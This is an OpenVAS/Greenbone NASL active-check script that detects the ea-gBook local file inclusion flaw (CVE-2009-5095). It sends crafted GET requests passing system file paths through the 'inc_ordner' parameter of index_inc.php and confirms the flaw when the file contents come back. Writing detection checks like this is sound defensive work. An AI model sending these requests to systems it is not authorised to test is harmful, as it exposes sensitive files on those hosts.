# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901207");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-09-23 16:39:49 +0200 (Fri, 23 Sep 2011)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2009-5095");

  script_name("ea-gBook <= 0.1.4 LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"ea-gBook is prone to local file inclusion (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of input passed via
  'inc_ordner' parameter to 'index_inc.php' script, which allows attackers to read arbitrary
  files.");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to gain
  sensitive information.");

  script_tag(name:"affected", value:"ea-gBook version 0.1.4 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://secunia.com/advisories/33927");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/33774");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/48759");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/8052/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

files = traversal_files();

host = http_host_name(port: port);

foreach dir (make_list_unique("/ea-gBook", "/gbuch", "/gb", "/guestbook", "/Gaestebuch",
                              http_cgi_dirs(port: port))) {

  if (dir == "/")
    dir = "";

  req = string(
        "GET ", dir, "/index.php?seite=0 HTTP/1.1\r\n",
        "Host: ", host, "\r\n",
        "Cookie: PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6\r\n",
        "Cache-Control: max-age=0\r\n\r\n");

  res = http_keepalive_send_recv(port: port,data: req);

  if ("<title>ea-gBook" >< res && "ea-style.de" >< res) {

    foreach file (keys(files)) {

      url = dir + "/index_inc.php?inc_ordner=/" + files[file];

      req = string(
            "GET ", url, " HTTP/1.1\r\n",
            "Host: ", host, "\r\n",
            "Cookie: PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6\r\n",
            "Cache-Control: max-age=0\r\n\r\n");

      res = http_keepalive_send_recv(port: port, data: req);

      if (egrep(pattern: file, string: res)) {
        report = http_report_vuln_url(port: port, url: url);
        security_message(port: port, data: report);
        exit(0);
      }
    }
  }
}

exit(99);
